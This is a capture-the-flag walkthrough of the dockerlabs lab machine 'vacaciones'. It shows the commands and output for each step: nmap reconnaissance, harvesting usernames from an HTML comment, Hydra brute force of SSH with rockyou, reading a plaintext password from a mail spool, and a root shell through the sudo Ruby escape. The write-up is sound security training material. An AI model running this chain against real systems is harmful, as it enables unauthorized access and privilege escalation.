# vacaciones

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| vacaciones | Romabri | Very Easy | dockerlabs |

**Summary:** The vacaciones machine presented two services: OpenSSH on port 22 and an Apache web server on port 80. The web server's root page contained no visible content for a browser visitor, but a `curl` request against it revealed that the entire HTTP body consisted of a single HTML comment directed from a user named "Juan" to a user named "Camilo", advising that an important email had been left for him. This comment exposed two candidate usernames in a single stroke. The name `camilo` was targeted for SSH brute force against `rockyou.txt`, and the trivially weak password `password1` was recovered in under three seconds. Once authenticated as `camilo`, a search for world-writable or SGID directories surfaced the `/var/mail` spool, where a mail file at `/var/mail/camilo/correo.txt` contained a message from `juan` confessing that he was going on vacation without finishing his assigned work, and leaving his system password (`2k84dicb`) embedded in plain text. Switching to the `juan` account with `su` and that password revealed a sudo entry granting passwordless execution of `/usr/bin/ruby` as any user. Using the GTFOBins technique for the Ruby interpreter, `exec "/bin/bash"` was passed via `-e` to spawn a bash shell inheriting root's UID, completing the privilege escalation chain across two lateral movements and one sudo misconfiguration.

---

## Reconnaissance

The machine was deployed through the standard dockerlabs automation script and assigned the IP address `172.17.0.2`.

**1.** Deploy the target container and record its address:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/dockerlabs/vacaciones]
└─$ sudo bash auto_deploy.sh vacaciones.tar
[sudo] password for ouba:

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2.** Set shell variables and launch a full-port versioned Nmap scan:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vacaciones]
└─$ ip=172.17.0.2 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vacaciones]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 09:05 WIB
Nmap scan report for 172.17.0.2
Host is up (0.000031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.39 seconds
```

Two services were identified: **TCP 22** running OpenSSH 7.6p1 on Ubuntu, and **TCP 80** running Apache 2.4.29. The Nmap HTTP title script reported that the page had no title and carried no text content visible to a browser, which suggested the entire page might be minimal or invisible markup. A direct `curl` request was necessary to inspect the raw HTTP response body.

---

## Web Enumeration and Username Extraction

**3.** Issue a full `curl` request to the web root and inspect the raw HTTP response:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vacaciones]
└─$ curl -i $url
HTTP/1.1 200 OK
Date: Wed, 11 Mar 2026 02:06:54 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Thu, 25 Apr 2024 08:13:29 GMT
ETag: "4a-616e75cb6bc40"
Accept-Ranges: bytes
Content-Length: 74
Vary: Accept-Encoding
Content-Type: text/html

<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

The entire body of the page, all 74 bytes, was a single HTML comment. Rendered in a browser, the page would appear completely blank. Translated from Spanish, the comment reads: *"From: Juan. To: Camilo. I left you an email, it's important."*

This comment inadvertently disclosed two usernames: **`juan`** and **`camilo`**. The message's content implied that `camilo` had received an email on the system, hinting at mail spool enumeration post-compromise. With two usernames in hand and an active SSH service, brute-force credential recovery was the immediate next step. The name `camilo` was chosen as the primary target, as the message was addressed to him and his account was therefore the more likely entry point.

---

## SSH Credential Recovery via Brute Force

**4.** Launch Hydra against the SSH service targeting the `camilo` account:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vacaciones]
└─$ hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 8
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-11 09:17:34
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-11 09:17:36
```

Hydra found the correct credentials in approximately **two seconds**: username `camilo`, password `password1`. This password is one of the highest-ranking entries in `rockyou.txt`, reflecting one of the weakest possible credential choices. The brute force succeeded before the status timer had even printed a single progress update.

---

## Initial Access as `camilo` and Mail Spool Discovery

**5.** Connect to the machine via SSH as `camilo` and search for world-writable or SGID directories that might expose interesting data:

```bash
camilo@c5bcc8bc223b:~$ find / -type d -perm -2000 -ls 2>/dev/null
   640324      4 drwxrwsr-x   3 root     staff        4096 Apr 25  2024 /usr/local/lib/python3.6
   640325      4 drwxrwsr-x   2 root     staff        4096 Apr 25  2024 /usr/local/lib/python3.6/dist-packages
   633390      4 drwxrwsr-x   2 root     staff        4096 Apr 24  2018 /var/local
   647534      4 drwxr-sr-x   2 root     systemd-journal     4096 Apr 25  2024 /var/log/journal
   649013      4 drwxrwsr-x   1 root     mail                4096 Apr 25  2024 /var/mail
   649014      4 drwxr-sr-x   2 root     mail                4096 Apr 25  2024 /var/mail/camilo
```

The `find` command searched for directories carrying the SGID bit, which causes child processes to inherit the owning group of the directory rather than the user's primary group. Among the results, `/var/mail` and `/var/mail/camilo` stood out immediately. The web page's comment had foreshadowed an important email waiting for `camilo`, and the mail spool at `/var/mail/camilo` was directly readable by the current user.

**6.** Navigate to the mail spool and read the waiting message:

```bash
camilo@c5bcc8bc223b:~$ cd /var/mail/camilo/
camilo@c5bcc8bc223b:/var/mail/camilo$ ls -la
total 12
drwxr-sr-x 2 root mail 4096 Apr 25  2024 .
drwxrwsr-x 1 root mail 4096 Apr 25  2024 ..
-rw-r--r-- 1 root mail  144 Apr 25  2024 correo.txt
camilo@c5bcc8bc223b:/var/mail/camilo$ cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

The email was from `juan`. Translated: *"Hi Camilo, I'm going on vacation and I haven't finished the work the boss gave me. In case he asks for it, here is the password: `2k84dicb`."* The machine's theme — "vacaciones" (vacations) — was encapsulated in this message. Juan had carelessly embedded his system password in a plaintext mail file, leaving it readable by anyone with access to the `camilo` account.

---

## Lateral Movement to `juan`

**7.** Switch to the `juan` account using the password recovered from the mail file:

```bash
camilo@c5bcc8bc223b:/var/mail/camilo$ su - juan
Password:
$ id;whoami;hostname
uid=1000(juan) gid=1000(juan) groups=1000(juan)
juan
c5bcc8bc223b
$ /bin/bash
juan@c5bcc8bc223b:~$ sudo -l
Matching Defaults entries for juan on c5bcc8bc223b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on c5bcc8bc223b:
    (ALL) NOPASSWD: /usr/bin/ruby
```

The `su` command accepted the password `2k84dicb` and dropped into a restricted `sh` session. A `/bin/bash` invocation upgraded it to a full bash shell. The `sudo -l` query for `juan` then revealed the decisive misconfiguration: the account could run `/usr/bin/ruby` as any user on the system **without providing a password**. This was the exact scenario foreshadowed by Juan's own note about unfinished work with insecure configurations left in place.

---

## Privilege Escalation via Ruby Shell Escape

The Ruby interpreter supports arbitrary code execution via the `-e` flag, which evaluates a string as a Ruby expression. The `exec` method in Ruby replaces the current process image with a new executable, inheriting the effective UID of the calling process. Since that process was running as root courtesy of sudo, the spawned shell was a root shell.

**8.** Invoke `ruby` as root and use `exec` to spawn an interactive bash shell:

```bash
juan@c5bcc8bc223b:~$ sudo /usr/bin/ruby -e 'exec "/bin/bash"'
root@c5bcc8bc223b:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
c5bcc8bc223b
root@c5bcc8bc223b:~# ls -la
total 20
drwxr-xr-x 2 juan juan 4096 Apr 25  2024 .
drwxr-xr-x 1 root root 4096 Apr 25  2024 ..
-rw-r--r-- 1 juan juan  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 juan juan 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 juan juan  807 Apr  4  2018 .profile
```

The single command `sudo /usr/bin/ruby -e 'exec "/bin/bash"'` replaced the Ruby process with a bash shell running as `uid=0(root)`. The chained `id;whoami;hostname` command confirmed full root access on container `c5bcc8bc223b`. The entire privilege escalation from the initial HTML comment to a root shell required no custom exploit, no compiled binary, and no vulnerability in any installed software.

---

## Attack Chain Summary

1. **Reconnaissance**: A full TCP port scan identified two services: OpenSSH 7.6p1 on port 22 and Apache 2.4.29 on port 80. A `curl` request to the web root revealed that the page body consisted entirely of an HTML comment addressed from `juan` to `camilo`, disclosing both usernames and hinting that a system mail awaited the `camilo` account.

2. **Vulnerability Discovery**: The HTML comment functioned as both a username source and a thematic breadcrumb for the engagement. The username `camilo` was extracted directly from it, and the reference to an "important email" pointed toward post-compromise mail spool enumeration as a lateral movement vector.

3. **Exploitation**: Hydra was used to brute-force the SSH service with username `camilo` and `rockyou.txt`. The password `password1`, one of the top entries in the wordlist, was recovered in approximately two seconds. SSH access was established immediately.

4. **Internal Enumeration**: After logging in as `camilo`, a `find` command searching for SGID directories surfaced `/var/mail/camilo`. The mail file `correo.txt` inside contained a message from `juan` embedding his system password (`2k84dicb`) in plain text, left as a convenience note before going on vacation. `su` was used with that password to pivot to the `juan` account, where `sudo -l` revealed passwordless ruby execution rights over all users.

5. **Privilege Escalation**: Using the GTFOBins technique for the Ruby interpreter, `sudo /usr/bin/ruby -e 'exec "/bin/bash"'` replaced the Ruby process with a root bash shell. The `exec` call inherited the root UID granted by sudo, completing the escalation chain and yielding an unrestricted root session on container `c5bcc8bc223b`.
